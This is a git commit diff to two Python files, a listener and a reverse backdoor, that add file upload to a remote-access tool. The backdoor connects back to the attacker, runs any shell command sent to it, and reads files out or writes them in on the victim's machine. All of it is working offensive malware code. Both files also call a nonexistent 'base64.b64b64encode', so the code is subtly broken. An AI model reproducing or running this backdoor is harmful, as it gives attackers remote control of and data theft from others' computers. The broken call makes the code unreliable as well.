f6726b505e19daef849e036e05235e2bac799dd5
root <root@localhost.localdomain>
2018-11-27 13:55:51 +0000

    Updates to program

--- listener.py
+++ listener.py
@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, json, base64
+import socket, json, base64, threading
 
 
 class Listener:
@@ -8,10 +8,8 @@ class Listener:
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Enable socket reuse
         listener.bind((ip, port))
-
         listener.listen(0)
         print("listening on [any] 8080...")
-
         self.connection, self.address = listener.accept()
         print("[+] Connection established with " + str(self.address[0]) + " on port " + str(self.address[1]))
 
@@ -23,15 +21,20 @@ class Listener:
         json_data = ""
         while True:
             try:
-                json_data += self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
             except ValueError:
                 continue
+
 
     def write_file(self, path, content):
         with open(path, "wb") as file:
             file.write(base64.b64decode(content))
             return "[+] Download successful!"
+
+    def read_files(self, path):
+        with open(path, "rb") as file:
+            return base64.b64b64encode(file.read())
 
     def execute_remotely(self, command):
         if command[0] == "exit":
@@ -42,18 +45,25 @@ class Listener:
         self.reliable_send(command)
         return self.reliable_receive()
 
+
     def run(self):
         while True:
             try:
                 command = raw_input(">> ")
                 command = command.split(" ")
+                if command[0] == "upload":
+                    file_content = self.read_files(command[1])
+                    command.append(file_content)
+
                 response = self.execute_remotely(command)
+
                 if command[0] == "download":
                     response = self.write_file(command[1], response)
-                print(response)
-            except KeyboardInterrupt:
-                print("\nTerminating connection...")
-                exit()
+            except Exception:
+                response = "[-] Error during command execution"
+
+            print(response)
+
 
 
 if __name__ == "__main__":
--- reverse_backdoor.py
+++ reverse_backdoor.py
@@ -16,7 +16,7 @@ class Backdoor:
         json_data = ""
         while True:
             try:
-                json_data += self.connection.recv(1024)
+                json_data = json_data + self.connection.recv(1024)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -32,6 +32,11 @@ class Backdoor:
         with open(path, "rb") as file:
             return base64.b64b64encode(file.read())
 
+    def write_file(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload successful..."
+
     def run(self):
         while True:
             try:
@@ -43,13 +48,14 @@ class Backdoor:
                     command_response = self.change_working_directory(command[1])
                 elif command[0] == "download":  # read the file to download by calling the read_files method
                     command_response = self.read_files(command[1])
+                elif command[0] == "upload":   # write the file to be uploaded to the file system
+                    command_response = self.write_file(command[1], command[2])
                 else:
                     command_response = self.execute_sys_command(command)    # Execute all other commands normally
+            except Exception:
+                command_response = "[-] Error during command execution..."
 
-                self.reliable_send(command_response)
-            except KeyboardInterrupt:
-                pass
-
+            self.reliable_send(command_response)
         self.connection.close()
 
 if __name__ == "__main__":
